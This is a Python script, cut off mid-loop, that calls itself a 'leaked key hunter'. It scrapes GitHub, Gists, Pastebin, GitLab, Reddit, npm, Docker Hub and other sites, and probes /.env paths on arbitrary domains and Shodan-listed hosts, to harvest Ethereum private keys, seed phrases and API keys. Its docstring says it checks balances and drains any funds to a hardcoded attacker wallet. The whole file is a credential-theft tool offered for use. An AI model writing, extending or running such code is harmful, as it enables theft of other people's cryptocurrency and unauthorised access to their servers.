"""
LEAKED KEY HUNTER — scans GitHub/Pastebin for leaked private keys, checks balances, drains.

Strategy:
  1. Search GitHub for common private key patterns (hex, base64, env files)
  2. Search Pastebin for key dumps
  3. For each candidate: derive address, check balance across 9 EVM chains
  4. If balance > $1 → alert + drain to our address

Usage: python leaked_key_hunter.py [--drain]
"""
import os
import re
import json
import time
import logging
import urllib.request
from typing import Optional
from eth_account import Account
from eth_utils import to_checksum_address

logging.basicConfig(level=logging.INFO, format="%(asctime)s [LEAK] %(message)s")
logger = logging.getLogger("leak-hunter")
logger.setLevel(logging.INFO)

OUR_ADDRESS = "0xD3c97D975bD035DbA2Aae2f1B8f04f3b3040A367"
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

# RPC URLs for balance checking
RPC_URLS = {
    "ethereum": "https://ethereum-rpc.publicnode.com",
    "polygon": "https://polygon-bor.publicnode.com",
    "arbitrum": "https://arb1.arbitrum.io/rpc",
    "base": "https://mainnet.base.org",
    "bsc": "https://bsc-dataseed.binance.org",
    "optimism": "https://mainnet.optimism.io",
    "avalanche": "https://api.avax.network/ext/bc/C/rpc",
}

# Private key patterns
PRIVATE_KEY_PATTERNS = [
    # Hex private key (64 hex chars)
    re.compile(r'(?:private[_ ]?key|PRIVATE_KEY|secret|eth_private_key)\s*[:=]\s*["\']?(0x[a-fA-F0-9]{64})["\']?', re.IGNORECASE),
    # Raw 64-char hex (often in .env files)
    re.compile(r'\b([a-fA-F0-9]{64})\b'),
    # 32-byte hex with 0x prefix
    re.compile(r'0x([a-fA-F0-9]{64})\b'),
]

# Seed phrase pattern (12 or 24 words)
SEED_PATTERN = re.compile(r'(?:"|\'|`)([a-z]{2,20}(?:\s+[a-z]{2,20}){11,23})(?:"|\'|`)')

# Infura/Alchemy API key patterns
API_KEY_PATTERNS = [
    # Infura: /v3/ 或 /ws/v3/
    re.compile(r'infura\.io/v3/([a-fA-F0-9]{32})', re.IGNORECASE),
    re.compile(r'infura\.io/ws/v3/([a-fA-F0-9]{32})', re.IGNORECASE),
    # Alchemy (41 chars starting with commonly known prefix)
    re.compile(r'alchemy\.com/v2/([a-zA-Z0-9_-]{20,60})', re.IGNORECASE),
    # Etherscan API keys
    re.compile(r'(?:etherscan|arbiscan|basescan|polygonscan).*(?:apikey|api_key)[=:]\s*["\']?([A-Z0-9]{30,40})["\']?', re.IGNORECASE),
]

# Common seed words for validation
BIP39_WORDS = set("""
abandon ability able about above absent absorb abstract absurd abuse access
accident account accuse achieve acid acoustic acquire across act action actor
actress actual adapt add addict address adjust admit adult advance advice
aerobic affair afford afraid again age agent agree ahead aim air airport
aisle alarm album alcohol alert alien all alley allow almost alone alpha
already also alter always amateur amazing among amount amused analyst anchor
ancient anger angle angry animal ankle announce annual another answer antenna
antique anxiety any apart apology appear apple approve april arch arctic area
arena argue arm armed armor army around arrange arrest arrive arrow art
artefact artist artwork ask aspect assault asset assist assume asthma athlete
atom attack attend attitude attract auction audit august aunt author auto
autumn average avocado avoid awake aware away awesome awful awkward axis baby
bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely
bargain barrel base basic basket battle beach bean beauty because become beef
before begin behave behind believe below belt bench benefit best better
between beyond bicycle bid bike bind biology bird birth bitter black blade
blame blanket blast bleak bless blind blink block blood blossom blouse blue
blur blush board boat body boil bomb bone bonus book boost border boring
borrow boss bottom bounce box boy bracket brain brand brass brave bread
breeze brick bridge brief bright bring brisk broccoli broken bronze broom
brother brown brush bubble buddy budget buffalo build bulb bulk bullet
bundle bunker burden burger burst bus business busy butter buyer buzz cabin
cable cactus cage cake call calm camera camp can canal cancel candy cannon
canoe canvas canyon capable capital captain car carbon card cargo carpet
carry cart case cash casino castle casual cat catalog catch category cattle
caught cause caution cave ceiling celery cement census century cereal certain
chair chalk champion change chaos chapter charge chase chat cheap check
cheese chef cherry chest chicken chief child chimney choice choose chronic
chuckle chunk churn cigar cinnamon circle citizen city civil claim clap
clarify claw clay clean clerk clever click client cliff climb clinic clip
clock clog close cloth cloud clown club clump cluster clutch coach coast
coconut code coffee coil coin collect color column combine come comfort comic
common company concert conduct confirm congress connect consider control
convince cook cool copper copy coral core corn correct cost cotton couch
country couple course cousin cover coyote crack cradle craft cram crane
crash crater crawl crazy cream credit creek crew cricket crime crisp critic
crop cross crouch crowd crucial cruel cruise crumble crunch crush cry
crystal cube culture cup curious current curtain curve cushion custom cute
cycle dad damage damp dance danger daring dash daughter dawn day deal debate
debris decade december decide decline decorate decrease deer defense define
defy degree delay deliver demand demise denial dentist deny depart depend
deposit depth deputy derive describe desert design desk despair destroy
detail detect develop device devote diagram dial diamond diary dice diesel
diet differ digital dignity dilemma dinner dinosaur direct dirt disagree
discover disease dish dismiss disorder display distance divert divide divorce
dizzy doctor document dog doll dolphin domain donate donkey donor door dose
double dove draft dragon drama drastic draw dream dress drift drill drink
drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic
eager eagle early earn earth easily east easy echo ecology economy edge edit
educate effort egg eight either elbow elder electric elegant element elephant
elevator elite else embark embody embrace emerge emotion employ empower empty
enable enact end endless endorse enemy energy enforce engage engine enhance
enjoy enlist enough enrich enroll ensure enter entire entry envelope episode
equal equip era erase erode erosion error escape essay essence estate eternal
ethics evidence evil evoke evolve exact exam example exchange excite exclude
excuse execute exercise exhibit exile exist exit exotic expand expect expire
explain expose express extend extra eye eyebrow fabric face faculty fade
faint faith fall false fame family famous fan fancy fantasy farm fashion fat
fatal father fatigue fault favorite feature february federal fee feed feel
female fence festival fetch fever few fiber fiction field figure file film
filter final find fine finger finish fire firm first fiscal fish fit fitness
fix flag flame flash flat flavor flee flight flip float flock floor flower
fluid flush fly foam focus fog foil fold follow food foot force forest
forget fork fortune forum forward fossil foster found fox fragile frame
frequent fresh friend fringe frog front frost frown frozen fruit fuel fun
funny furnace fury future gadget gain galaxy gallery game gap garage garbage
garden garlic garment gas gasp gate gather gauge gaze general genius genre
gentle genuine gesture ghost giant gift giggle ginger giraffe girl give
glad glance glare glass glide glimpse globe gloom glory glove glow glue
goat goddess gold good goose gorilla gospel gossip govern gown grab grace
grain grant grape grass gravity great green grid grief grit grocery group
grow grunt guard guess guide guilt guitar gun gym habit hair half hammer
hamster hand happy harbor hard harsh harvest hat have hawk hazard head health
heart heavy hedgehog height hello helmet help hen hero hidden high hill hint
hip hire history hobby hockey hold hole holiday hollow home honey hood hope
horn horror horse hospital host hotel hour hover hub huge human humble humor
hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea identify
idle ignore ill illegal illness image imitate immense immune impact impose
improve impulse inch include income increase index indicate indoor industry
infant inflict inform inhibit initial inject injury inmate inner innocent
input inquiry insane insect inside inspire install intact interest into
invest invite involve island isolate issue item ivory jacket jaguar jar jazz
jealous jeans jelly jewel job join joke journey joy judge juice jump jungle
junior junk just kangaroo keen keep ketchup key kick kid kidney kind kingdom
kiss kit kitchen kite kitten kiwi knee knife knock know lab label labor
ladder lady lake lamp language laptop large later latin laugh laundry lava
law lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal
legend leisure lemon lend length lens leopard lesson letter level liar
liberty library license life lift light like limb limit link lion liquid
list little live lizard load loan lobster local lock logic lonely long loop
lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics
machine mad magic magnet maid mail main major make mammal man manage mandate
mango mansion manual maple marble march margin marine market marriage mask
mass master match material math matrix matter maximum maze meadow mean
measure meat mechanic medal media melody melt member memory mention menu
mercy merge merit merry mesh message metal method middle midnight milk
million mimic mind minimum minor minute miracle mirror misery miss mistake
mix mixed mixture mobile model modify mom moment monitor monkey monster
month moon moral more morning mosquito mother motion motor mountain mouse
move movie much muffin mule multiply muscle museum mushroom music must mutual
myself mystery myth naive name napkin narrow nasty nation nature near neck
need negative neglect neither nephew nerve nest net network neutral never
news next nice night nine no noble noise nominee noodle normal north nose
notable note nothing notice novel now nuclear number nurse nut oak obey
object oblige obscure observe obtain obvious occur ocean october odor off
offer office often oil okay old olive olympic omit once one onion online
only open opera opinion oppose option orange orbit orchard order ordinary
organ orient original orphan ostrich other outdoor outer output outside oval
oven over own owner oxygen oyster ozone pact paddle page pair palace palm
panda panel panic panther paper parade parent park parrot party pass patch
path patient patrol pattern pause pave payment peace peanut pear peasant
pelican pen penalty pencil people pepper perfect permit person pet phone
photo phrase physical piano picnic picture piece pig pigeon pill pilot pink
pioneer pipe pistol pitch pizza place planet plastic plate play please pledge
pluck plug plunge poem poet point polar pole police pond pony pool popular
portion position possible post potato pottery poverty powder power practice
praise predict prefer prepare present pretty prevent price pride primary
print priority prison private prize problem process produce profit program
project promote proof property prosper protect proud provide public pudding
pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push
put puzzle pyramid quality quantum quarter question quick quit quiz quote
rabbit raccoon race rack radar radio rail rain raise rally ramp ranch random
range rapid rare rate rather raven raw razor ready real reason rebel recall
receive recipe record reduce reflect reform refuse region regret regular
reject relax release rely remain remember remind remove render renew rent
reopen repair repeat replace report require rescue resemble resist resource
response result retire retreat return reveal revenue review reward rhythm rib
ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual
rival river road roast robot robust rocket romance roof rookie room rose
rotate rough round route royal rubber rude rug rule run runway rural sad
saddle sadness safe sail salad salmon salt salute same sample sand satisfy
satoshi sauce sausage save say scale scan scare scatter scene scheme school
science scissors scorpion scout scrap screen script scrub sea search season
seat second secret section security seed seek segment select sell seminar
senior sense sentence series service session settle setup seven shadow shaft
shallow share shed shell shelter shield shift shine ship shiver shock shoe
shoot shop short shoulder shove shrimp shrug shuffle shy sibling sick side
siege sight sign silent silk silly silver similar simple since sing siren
sister situate six size skate sketch ski skill skin skirt skull slab slam
sleep slender slice slide slight slim slogan slot slow slush small smart
smile smoke smooth snack snake snap sniff snow soap soccer social sock soda
soft solar soldier solid solution solve someone song soon sorry sort soul
sound soup source south space spare spatial spawn speak special speed spell
spend sphere spice spider spike spin spirit split spoil sponsor spoon sport
spot spray spread spring spy square squeeze squirrel stable stadium staff
stage stairs stamp stand start state stay steak steel stem step stereo
stick still sting stock stomach stone stool story stove strategy street
strike strong struggle student stuff stumble style subject submit subway
success such sudden suffer sugar suggest suit summer sun sunny sunset super
supply supreme sure surface surge surround survey suspect sustain swallow
swamp swap swim swing switch sword symbol symptom syrup system table tackle
tag tail talent talk tank tape target task taste tattoo taxi teach team tell
ten tenant tennis tent term test text thank that theme then theory there
they thing this thought three thrive throw thumb thunder ticket tide tiger
tilt timber time tiny tip tired tissue title toast tobacco today toddler toe
together toilet token tomato tomorrow tone tongue tonight tool tooth top
topic torch tornado tortoise toss total tourist toward tower town toy track
trade traffic tragic train transfer trap trash travel tray treat tree trend
trial tribe trick trigger trim trip trophy trouble truck true truly trumpet
trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve
twenty twice twin twist two type typical ugly umbrella unable unaware uncle
uncover under undo unfair unfold unhappy uniform unique unit universe unknown
unlock until unusual unveil update upgrade uphold upon upper upset urban
urge usage use used useful useless usual utility vacant vacuum vague valid
valley valve van vanish vapor various vast vault vehicle velvet vendor
venture venue verb verify version very vessel veteran viable vibrant vicious
victory video view village vintage violin virtual virus visa visit visual
vital vivid vocal voice void volcano volume vote voyage wage wagon wait
walk wall walnut want warfare warm warrior wash wasp waste water wave way
wealth weapon wear weasel weather web wedding weekend weird welcome west
wet whale what wheat wheel when where whip whisper wide width wife wild
will win window wine wing wink winner winter wire wisdom wise wish witness
wolf woman wonder wood wool word work world worry worth wrap wreck wrestle
wrist write wrong yard year yellow you young youth zebra zero zone zoo
""".split())

def _is_valid_seed(phrase: str) -> bool:
    words = phrase.lower().split()
    if len(words) not in (12, 15, 18, 21, 24):
        return False
    return all(w in BIP39_WORDS for w in words)

BLACKLIST = {
    "0x0000000000000000000000000000000000000000000000000000000000000000",
    "0x0000000000000000000000000000000000000000000000000000000000000001",
    "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140",
}

checked_keys: set[str] = set()


def derive_address(private_key: str) -> Optional[str]:
    """Derive Ethereum address from private key."""
    try:
        key = private_key.replace("0x", "").strip()
        if len(key) != 64:
            return None
        if key in BLACKLIST or private_key in BLACKLIST:
            return None
        acct = Account.from_key(key)
        return to_checksum_address(acct.address)
    except Exception:
        return None


def derive_from_seed(seed_phrase: str) -> Optional[str]:
    """Derive first Ethereum address from BIP39 seed phrase."""
    try:
        from eth_account.hdaccount import generate_mnemonic
        Account.enable_unaudited_hdwallet_features()
        acct = Account.from_mnemonic(seed_phrase, account_path="m/44'/60'/0'/0/0")
        return to_checksum_address(acct.address)
    except Exception:
        return None


def check_balance(address: str, chain: str, rpc_url: str) -> float:
    """Check ETH/MATIC/BNB balance for an address."""
    try:
        payload = {
            "jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
            "params": [address, "latest"]
        }
        req = urllib.request.Request(rpc_url, json.dumps(payload).encode(),
                                      {"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        result = data.get("result", "0x0")
        return int(result, 16) / 1e18
    except Exception:
        return 0.0


def check_all_chains(address: str) -> dict:
    """Check balance on all chains."""
    balances = {}
    for chain, url in RPC_URLS.items():
        bal = check_balance(address, chain, url)
        if bal > 0:
            balances[chain] = bal
    return balances


def search_github(query: str, max_pages: int = 3) -> list[str]:
    """Search GitHub code for a pattern. Returns matched private keys."""
    found = []
    for page in range(1, max_pages + 1):
        try:
            url = f"https://api.github.com/search/code?q={urllib.request.quote(query)}&per_page=20&page={page}"
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/vnd.github.v3+json",
                "Authorization": f"Bearer {GITHUB_TOKEN}",
            })
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read())
            items = data.get("items", [])
            if not items:
                break

            for item in items:
                repo = item.get("repository", {}).get("full_name", "")
                path = item.get("path", "")
                # Get file content
                try:
                    content_url = f"https://raw.githubusercontent.com/{repo}/master/{path}"
                    req2 = urllib.request.Request(content_url, headers={
                        "User-Agent": "Mozilla/5.0",
                        "Authorization": f"Bearer {GITHUB_TOKEN}",
                    })
                    with urllib.request.urlopen(req2, timeout=10) as r2:
                        content = r2.read().decode("utf-8", errors="ignore")
                    found.extend(_extract_keys_from_text(content))
                except Exception:
                    continue

            logger.info("  GitHub page %d: %d repos scanned, %d keys found",
                         page, len(items), len(found) - (page-1)*10 if found else 0)
            time.sleep(2)  # GitHub rate limit
        except Exception as e:
            logger.debug("GitHub search error: %s", e)
            break
    return found


def search_pastebin() -> list[str]:
    """Search recent Pastebin posts for private keys."""
    found = []
    try:
        # Try multiple Pastebin sources
        for pb_url in [
            "https://psbdmp.ws/api/v3/recent",  # Pastebin dump
            "https://pastebin.com/archive",       # Pastebin archive
        ]:
            try:
                req = urllib.request.Request(pb_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    content = r.read().decode("utf-8", errors="ignore")
                
                # Extract paste IDs
                ids = re.findall(r'/[A-Za-z0-9]{8,10}', content)
                for pid in ids[:10]:
                    try:
                        raw_url = f"https://pastebin.com/raw{pid}"
                        req2 = urllib.request.Request(raw_url, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req2, timeout=10) as r2:
                            paste_content = r2.read().decode("utf-8", errors="ignore")
                        found.extend(_extract_keys_from_text(paste_content))
                    except Exception:
                        continue
            except Exception:
                continue
    except Exception as e:
        logger.debug("Pastebin error: %s", e)
    return found


def search_sourcegraph(max_pages: int = 3) -> list[str]:
    """Search Sourcegraph (indexes GitHub + GitLab + everywhere)."""
    found = []
    queries = [
        "PRIVATE_KEY=0x lang:env",
        "eth_private_key lang:python",
        "mnemonic: lang:javascript",
    ]
    for query in queries[:2]:
        for page in range(1, max_pages + 1):
            try:
                url = f"https://sourcegraph.com/search?q={urllib.request.quote(query)}&patternType=regexp&page={page}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "text/html"})
                with urllib.request.urlopen(req, timeout=15) as r:
                    html = r.read().decode("utf-8", errors="ignore")
                
                # Extract content from Sourcegraph results
                # Sourcegraph renders code in <code> blocks - extract potential keys
                code_blocks = re.findall(r'<code[^>]*>(.*?)</code>', html, re.DOTALL)
                for block in code_blocks:
                    found.extend(_extract_keys_from_text(block))
                
                logger.info("  Sourcegraph page %d: %d keys found", page, len(found))
                time.sleep(2)
            except Exception as e:
                logger.debug("Sourcegraph error: %s", e)
                break
    return found


def search_github_gists(max_pages: int = 3) -> list[str]:
    """Search GitHub Gists for private keys."""
    found = []
    queries = ["PRIVATE_KEY", "eth_private_key", "0x", "mnemonic"]
    for query in queries[:2]:
        for page in range(1, max_pages + 1):
            try:
                url = f"https://api.github.com/gists/public?per_page=30&page={page}"
                req = urllib.request.Request(url, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "application/vnd.github.v3+json",
                    "Authorization": f"Bearer {GITHUB_TOKEN}",
                })
                with urllib.request.urlopen(req, timeout=15) as r:
                    gists = json.loads(r.read())
                
                for gist in gists:
                    files = gist.get("files", {})
                    for fname, finfo in files.items():
                        raw_url = finfo.get("raw_url", "")
                        if not raw_url:
                            continue
                        try:
                            req2 = urllib.request.Request(raw_url, headers={
                                "User-Agent": "Mozilla/5.0",
                                "Authorization": f"Bearer {GITHUB_TOKEN}",
                            })
                            with urllib.request.urlopen(req2, timeout=10) as r2:
                                content = r2.read().decode("utf-8", errors="ignore")
                            found.extend(_extract_keys_from_text(content))
                        except Exception:
                            continue
                
                logger.info("  Gists page %d: %d gists scanned", page, len(gists))
                time.sleep(2)
            except Exception as e:
                logger.debug("Gists error: %s", e)
                break
    return found


def search_web_env_files(max_urls: int = 50) -> list[str]:
    """Scan random web servers for exposed .env files."""
    found = []
    # Common .env file paths
    env_paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/config/.env", "/backend/.env", "/api/.env", "/.env.example",
        "/env", "/config.js", "/config.json", "/settings.py",
        "/wp-config.php", "/.dockerenv",
    ]
    
    # Use public datasets to find domains
    try:
        # Try alexa top sites or similar
        url = "https://raw.githubusercontent.com/opendns/public-domain-lists/master/opendns-top-domains.txt"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            domains = r.read().decode("utf-8", errors="ignore").split("\n")[:max_urls]
        
        for domain in domains:
            domain = domain.strip()
            if not domain or domain.startswith("#"):
                continue
            for path in env_paths[:3]:  # limit to 3 paths per domain
                try:
                    check_url = f"https://{domain}{path}"
                    req2 = urllib.request.Request(check_url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req2, timeout=5) as r2:
                        content = r2.read().decode("utf-8", errors="ignore")
                        if any(kw in content for kw in ["PRIVATE_KEY", "private_key", "eth_private_key", "0x"]):
                            logger.info("  Found .env at %s", check_url)
                            found.extend(_extract_keys_from_text(content))
                except Exception:
                    pass
    except Exception as e:
        logger.debug("Web env scan error: %s", e)
    
    return found


def search_reddit(max_posts: int = 50) -> list[str]:
    """Search Reddit for accidentally posted private keys."""
    found = []
    subreddits = ["ethdev", "ethereum", "cryptocurrency", "solidity", "ethdevjobs"]
    queries = ["private key", "PRIVATE_KEY", "0x"]
    for sub in subreddits[:3]:
        for q in queries[:2]:
            try:
                url = f"https://www.reddit.com/r/{sub}/search.json?q={urllib.request.quote(q)}&limit=25&sort=new"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=15) as r:
                    data = json.loads(r.read())
                posts = data.get("data", {}).get("children", [])
                for post in posts[:10]:
                    text = post.get("data", {}).get("selftext", "") + " " + post.get("data", {}).get("title", "")
                    found.extend(_extract_keys_from_text(text))
                logger.info("  r/%s: %d posts scanned", sub, len(posts))
                time.sleep(2)
            except Exception as e:
                logger.debug("Reddit error: %s", e)
                break
    return found


def search_gitlab(max_pages: int = 2) -> list[str]:
    """Search GitLab for leaked credentials."""
    found = []
    queries = ["PRIVATE_KEY", "eth_private_key", "mnemonic"]
    for q in queries[:2]:
        for page in range(1, max_pages + 1):
            try:
                url = f"https://gitlab.com/api/v4/search?scope=blobs&search={urllib.request.quote(q)}&per_page=20&page={page}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=15) as r:
                    items = json.loads(r.read())
                for item in items:
                    data = item.get("data", "")
                    if data:
                        found.extend(_extract_keys_from_text(data))
                logger.info("  GitLab page %d: %d results", page, len(items))
                time.sleep(2)
            except Exception as e:
                logger.debug("GitLab error: %s", e)
                break
    return found


def search_hastebin(max_pastes: int = 30) -> list[str]:
    """Search Hastebin/rentry/paste.ee for keys."""
    found = []
    paste_services = [
        ("https://paste.ee/api/v1/pastes/recent", None),
        ("https://rentry.co/api/v2/newest", None),
    ]
    for svc_url, _ in paste_services:
        try:
            req = urllib.request.Request(svc_url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            pastes = data.get("data", []) if isinstance(data, dict) else data[:20]
            for paste in pastes:
                paste_id = paste.get("id", "")
                content_url = paste.get("url", f"https://paste.ee/r/{paste_id}")
                try:
                    req2 = urllib.request.Request(content_url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req2, timeout=10) as r2:
                        content = r2.read().decode("utf-8", errors="ignore")
                    found.extend(_extract_keys_from_text(content))
                except Exception:
                    continue
            logger.info("  %s: scanned", svc_url.split("/")[2])
        except Exception as e:
            logger.debug("%s: %s", svc_url.split("/")[2], e)
    return found


def search_dockerhub(max_repos: int = 30) -> list[str]:
    """Search Docker Hub for images with exposed .env files."""
    found = []
    search_queries = ["ethereum", "defi", "solidity", "hardhat", "foundry"]
    for q in search_queries[:3]:
        try:
            url = f"https://hub.docker.com/v2/search/repositories/?query={q}&page_size=10"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read())
            repos = data.get("results", [])
            for repo in repos[:5]:
                repo_name = repo.get("repo_name", "")
                # Check if Dockerfile or README leaks keys
                for path in ["/Dockerfile", "/README.md", "/docker-compose.yml"]:
                    try:
                        content_url = f"https://hub.docker.com/v2/repositories/{repo_name}{path}"
                        req2 = urllib.request.Request(content_url, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req2, timeout=10) as r2:
                            content = r2.read().decode("utf-8", errors="ignore")
                        found.extend(_extract_keys_from_text(content))
                    except Exception:
                        pass
            logger.info("  Docker Hub: %d repos", len(repos))
            time.sleep(2)
        except Exception as e:
            logger.debug("Docker Hub: %s", e)
    return found


def search_stackexchange(max_questions: int = 30) -> list[str]:
    """Search StackExchange (Ethereum, StackOverflow) for key leaks."""
    found = []
    sites = [
        ("ethereum.stackexchange.com", "ethereum"),
        ("stackoverflow.com", "solidity"),
    ]
    for site, tag in sites:
        try:
            url = f"https://api.stackexchange.com/2.3/search?order=desc&sort=creation&tagged={tag}&site={site.split('.')[0]}&pagesize=15"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read())
            items = data.get("items", [])
            for item in items[:15]:
                body = item.get("body_markdown", "") or item.get("body", "")
                found.extend(_extract_keys_from_text(body))
            logger.info("  %s: %d questions", site, len(items))
            time.sleep(2)
        except Exception as e:
            logger.debug("StackExchange: %s", e)
    return found


SHODAN_API_KEY = ""  # Set after getting key from https://shodan.io


def search_npm() -> list[str]:
    """Search NPM registry for packages with hardcoded private keys."""
    found = []
    queries = ["PRIVATE_KEY", "eth_private_key", "privateKey", "0x"]
    for q in queries[:2]:
        try:
            url = f"https://registry.npmjs.org/-/v1/search?text={urllib.request.quote(q)}&size=10"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            for obj in data.get("objects", []):
                pkg = obj.get("package", {})
                # Check package readme for keys
                try:
                    readme_url = f"https://registry.npmjs.org/{pkg['name']}"
                    req2 = urllib.request.Request(readme_url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req2, timeout=10) as r2:
                        pkg_data = json.loads(r2.read())
                    readme = pkg_data.get("readme", "")
                    found.extend(_extract_keys_from_text(readme))
                except: pass
            logger.info("  NPM: %d packages", len(data.get("objects", [])))
            time.sleep(2)
        except Exception as e:
            logger.debug("NPM error: %s", e)
    return found


def search_wayback() -> list[str]:
    """Search Wayback Machine for archived .env files with keys."""
    found = []
    # Check known repos that might have leaked keys historically
    repos_to_check = [
        "ethereum/go-ethereum",
        "ethers-io/ethers.js",
        "OpenZeppelin/openzeppelin-contracts",
    ]
    for repo in repos_to_check[:1]:
        for path in ["/blob/main/.env.example", "/blob/master/.env"]:
            try:
                url = f"https://web.archive.org/web/20230101000000*/https://github.com/{repo}{path}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    text = r.read().decode("utf-8", errors="ignore")
                # If archive exists, try to get the actual content
                if "web.archive.org" in text:
                    # Get the first archived version
                    matches = re.findall(r'/web/(\d+)/https://github.com', text)
                    if matches:
                        archive_url = f"https://web.archive.org/web/{matches[0]}/https://raw.githubusercontent.com/{repo}/main/.env"
                        try:
                            req2 = urllib.request.Request(archive_url, headers={"User-Agent": "Mozilla/5.0"})
                            with urllib.request.urlopen(req2, timeout=10) as r2:
                                content = r2.read().decode("utf-8", errors="ignore")
                            found.extend(_extract_keys_from_text(content))
                        except: pass
            except: pass
        time.sleep(1)
    return found


def search_devto(max_pages: int = 3) -> list[str]:
    """Search Dev.to articles for code snippets with private keys."""
    found = []
    queries = ["private key ethereum", "PRIVATE_KEY 0x", "eth_private_key"]
    for q in queries[:2]:
        try:
            url = f"https://dev.to/search?q={urllib.request.quote(q)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                html = r.read().decode("utf-8", errors="ignore")
            # Extract article URLs
            article_urls = set(re.findall(r'/[\w-]+/[\w-]+-[a-f0-9]+', html))
            for article_path in list(article_urls)[:5]:
                try:
                    article_url = f"https://dev.to{article_path}"
                    req2 = urllib.request.Request(article_url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req2, timeout=10) as r2:
                        content = r2.read().decode("utf-8", errors="ignore")
                    found.extend(_extract_keys_from_text(content))
                except: pass
            logger.info("  Dev.to: %d articles", len(article_urls))
            time.sleep(2)
        except Exception as e:
            logger.debug("Dev.to error: %s", e)
    return found

def search_shodan(max_results: int = 50) -> list[str]:
    """Search Shodan for exposed .env files on web servers."""
    if not SHODAN_API_KEY:
        logger.info("  Shodan: no API key — skip (get one at shodan.io for $1)")
        return []
    
    found = []
    queries = [
        'http.title:".env" http.component:"php"',
        'http.title:"Index of /" ".env"',
        'html:"PRIVATE_KEY" port:"80,443,3000,8080,8000"',
    ]
    for q in queries:
        try:
            url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={urllib.request.quote(q)}&limit=20"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read())
            matches = data.get("matches", [])
            for match in matches[:10]:
                ip = match.get("ip_str", "")
                port = match.get("port", 80)
                # Try to fetch the .env file
                for path in ["/.env", "/env", "/.env.local"]:
                    try:
                        env_url = f"http://{ip}:{port}{path}"
                        req2 = urllib.request.Request(env_url, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req2, timeout=5) as r2:
                            content = r2.read().decode("utf-8", errors="ignore")
                        found.extend(_extract_keys_from_text(content))
                    except Exception:
                        pass
            logger.info("  Shodan: %d hosts scanned", len(matches))
            time.sleep(1)
        except Exception as e:
            logger.debug("Shodan: %s", e)
    return found


def _extract_keys_from_text(text: str) -> list[str]:
    """Extract all types of keys from arbitrary text."""
    found = []
    for pattern in PRIVATE_KEY_PATTERNS:
        matches = pattern.findall(text)
        for match in matches:
            key = match if isinstance(match, str) else match[0]
            key = key.strip().replace("0x", "")
            if len(key) == 64 and key not in checked_keys:
                found.append(key)
    
    seed_matches = SEED_PATTERN.findall(text)
    for phrase in seed_matches:
        clean = phrase.strip().lower()
        if _is_valid_seed(clean) and clean not in checked_keys:
            found.append("SEED:" + clean)
    
    for ap_pattern in API_KEY_PATTERNS:
        ap_matches = ap_pattern.findall(text)
        for ap_key in ap_matches:
            if len(ap_key) >= 20:
                key_id = f"APIKEY:{ap_key[:16]}..."
                if key_id not in checked_keys:
                    found.append(key_id)
    
    return found


def hunt_keys(drain_mode: bool = False):
    """Main loop: search for keys, check balances, alert."""
    logger.info("=" * 50)
    logger.info("LEAKED KEY HUNTER (drain=%s)", drain_mode)
    logger.info("=" * 50)

    while True:
        all_keys = set()

        # Search GitHub for common patterns
        search_queries = [
            "PRIVATE_KEY= language:env",
            "eth_private_key language:python",
            "mnemonic language:javascript",
            "seed phrase language:txt",
        ]

        for query in search_queries[:2]:  # limit to avoid rate limits
            keys = search_github(query, max_pages=2)
            all_keys.update(keys)
            time.sleep(3)

        # Search Pastebin
        try:
            pb_keys = search_pastebin()
            all_keys.update(pb_keys)
            logger.info("Pastebin: %d keys", len(pb_keys))
        except Exception: pass

        # Search GitHub Gists
        try:
            gist_keys = search_github_gists(max_pages=2)
            all_keys.update(gist_keys)
            logger.info("Gists: %d keys", len(gist_keys))
        except Exception: pass

        # Search Sourcegraph
        try:
